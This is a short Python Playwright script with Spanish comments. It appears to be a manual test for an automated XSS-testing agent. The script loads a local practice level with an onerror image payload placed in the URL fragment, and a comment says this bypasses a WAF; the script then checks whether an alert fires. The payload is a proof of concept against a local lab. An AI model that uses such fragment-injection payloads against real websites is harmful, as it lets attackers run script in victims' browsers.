#!/usr/bin/env python3
"""
Test directo Fragment XSS Level 7
Prueba manual sin el agente completo
"""
import asyncio
from playwright.async_api import async_playwright

async def test_fragment_direct():
    print("\n🎯 Test Directo: Fragment XSS en Level 7\n")
    print("="*60)
    
    # La URL con fragment - bypasea WAF
    test_url = "http://127.0.0.1:5090/xss/level7#<img src=x onerror=alert('FRAGMENT_XSS')>"
    
    print(f"URL a testear:\n{test_url}\n")
    print("🔍 Lanzando browser...")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)  # Visible para debug
        page = await browser.new_page()
        
        # Capturar diálogos (alert)
        dialog_fired = False
        async def handle_dialog(dialog):
            nonlocal dialog_fired
            print(f"\n✅ ALERT DETECTADO: {dialog.message}")
            dialog_fired = True
            await dialog.accept()
        
        page.on("dialog", handle_dialog)
        
        try:
            print("📍 Navegando...")
            await page.goto(test_url, wait_until="networkidle", timeout=10000)
            
            # Esperar un poco para que el JS se ejecute
            await asyncio.sleep(2)
            
            # Verificar en consola
            logs = []
            page.on("console", lambda msg: logs.append(msg.text))
            
            # Verificar DOM
            html = await page.content()
            
            print("\n" + "="*60)
            if dialog_fired:
                print("🎉 ¡ÉXITO! Fragment XSS ejecutado\n")
                print("📊 Evidencia:")
                print("  - Alert dialog capturado")
                return True
            elif "<img src=x onerror=" in html:
                print("🟡 XSS inyectado en DOM pero no ejecutado\n")
                print("HTML snippet:")
                print(html[html.find("<img"):html.find("<img")+100])
                return False
            else:
                print("❌ Fragment XSS NO inyectado\n")
                print("HTML recibido:")
                print(html[:500])
                return False
                
        except Exception as e:
            print(f"\n❌ Error: {e}")
            return False
        finally:
            await browser.close()

if __name__ == "__main__":
    result = asyncio.run(test_fragment_direct())
    exit(0 if result else 1)
